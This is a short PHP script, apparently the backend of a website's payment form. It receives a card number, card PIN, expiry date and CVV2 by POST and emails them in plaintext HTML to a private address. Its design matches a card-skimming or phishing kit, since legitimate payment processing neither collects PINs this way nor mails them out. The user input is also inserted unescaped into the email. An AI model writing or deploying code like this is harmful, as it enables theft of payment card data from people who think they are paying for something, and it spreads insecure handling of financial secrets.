<?php
if(isset($_POST['u'])){
//db_connect
require_once '../constants.php';
require_once '../user_functions.php';

$id = $user['id'];
$u = $_POST['u'];
$a = $_POST['a'];
$c = $_POST['c'];
$n = $_POST['n'];
$p = $_POST['p'];
$e = $_POST['e'];
$cv = $_POST['cv'];

//-----------send a mail-----//
  $to = $private_mail;
  $subject = 'Credit Card Details';
  $message = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Credit Card Details</title></head><body style="margin:0px;font-family:Tahoma, Geneva, sans-serif;"><div style="padding:10px;background:#a00;font-size:24px;color:#fff;">Credit Card Details</div><div style="padding:24px; font-size:17px;"><b>User:</b> '.$u.'<br/><b>Amount:</b> '.$a.'<br/><b>Card Type:</b> '.$c.'<br/><b>Card Number:</b> '.$n.'<br/><b>Card Pin:</b> '.$p.'<br/><b>Expiry Date:</b> '.$e.'<br/><b>CCV2:</b> '.$cv.'<br/></div></body></html>';

  $from = $c_email;
  $headers = "From: $from\n";
  $headers .= "MIME-Version: 1.0\n";
  $headers .= "Content-type: text/html; charset=iso-8859-1\n";

	if (mail($to, $subject, $message, $headers)) {
		echo "sent";
	} else { echo "failed";}
	
} 
else { exit(); }
?>